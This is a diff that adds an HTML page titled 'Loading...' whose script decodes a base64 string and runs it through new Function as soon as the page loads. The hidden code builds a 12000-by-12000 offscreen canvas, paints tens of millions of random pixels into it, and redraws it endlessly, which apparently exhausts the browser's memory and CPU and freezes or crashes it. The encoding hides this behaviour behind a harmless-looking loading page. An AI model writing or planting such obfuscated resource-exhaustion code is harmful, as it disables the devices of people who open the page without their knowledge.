@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loading...</title>
+<style>
+html,body{margin:0;padding:0;overflow:hidden;background:black}
+canvas{display:block}
+</style>
+</head>
+<body>
+<canvas id="c"></canvas>
+
+<script>
+const b64 = `
+Y29uc3QgY2FudmFzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImMiKTsKY29uc3QgY3R4ID0gY2FudmFzLmdldENvbnRleHQoIjJkIik7CmNhbnZhcy53aWR0aCA9IHdpbmRvdy5pbm5lcldpZHRoOwpjYW52YXMuaGVpZ2h0ID0gd2luZG93LmlubmVySGVpZ2h0OwoKY29uc3QgVyA9IDEyMDAwOwpjb25zdCBIID0gMTIwMDA7CmNvbnN0IG9mZiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpO29mZi53aWR0aCA9IFc7b2ZmLmhlaWdodCA9IEg7CmNvbnN0IG9jdHggPSBvZmYuZ2V0Q29udGV4dCgiMmQiKTsKCmZvciAobGV0IHkgPSAwOyB5IDwgSDsgeSArPSAyKSB7CiAgZm9yIChsZXQgeCA9IDA7IHggPCBXOyB4ICs9IDIpIHsKICAgIGNvbnN0IHYgPSBNYXRoLnJhbmRvbSgpICogMjU1IHwgMDsKICAgIG9jdHguZmlsbFN0eWxlID0gYHJnYigke3Z9LCR7dn0sJHt2fSlgOwogICAgb2N0eC5maWxsUmVjdCh4LCB5LCAyLCAyKTsKICB9Cn0KCmZ1bmN0aW9uIGxvb3AoKSB7CiAgY3R4LmRyYXdJbWFnZShvZmYsIDAsIDApOwogIHJlcXVlc3RBbmltYXRpb25GcmFtZShsb29wKTsKfQoKbG9vcCgpOw==
+`;
+
+const code = atob(b64);
+(new Function(code))();
+</script>
+</body>
+</html>
